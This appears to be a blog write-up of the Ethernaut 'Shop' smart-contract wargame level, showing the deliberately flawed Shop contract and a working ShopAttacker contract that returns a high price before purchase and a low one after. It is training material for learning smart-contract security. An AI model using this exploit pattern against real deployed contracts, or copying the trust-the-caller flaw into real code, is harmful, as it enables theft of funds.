---
layout: post
title: Ethernaut - 21. Shop
date:  2022-08-29
tags: ethernaut solidity
---

## Difficulty: 🌕🌕🌑🌑🌑
> Сan you get the item from the shop for less than the price asked? <br /> <br />
  Things that might help:
  - Shop expects to be used from a Buyer
  - Understanding restrictions of view functions

## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

## Writeup
This level is similar to 11-elevator. `buy` method calls `_buyer.price()` twice.<br />
If `_buyer.price()` return value>=100 the first time it is called and return value<100 the second time, we can get the item from the shop for less than the price asked.

1. Get new instance.
2. Create a contract 
    ``` solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import './21_Shop.sol';

    contract ShopAttacker {
        Shop shop;

        constructor(address _addr) public {
            shop = Shop(_addr);
        }

        function price() external view returns (uint) {
            return ( shop.isSold()==true ) ? 10 : 110;
        }

        function buybuy() public {
            shop.buy();
        }
    }
    ```
3. Check if success by calling method in the console.
    ``` javascript

    await contract.isSold()
    // true
    await contract.price().then( v=> v.toString())
    // 10

    ```
4. Submit instance ξ( ✿＞◡❛)

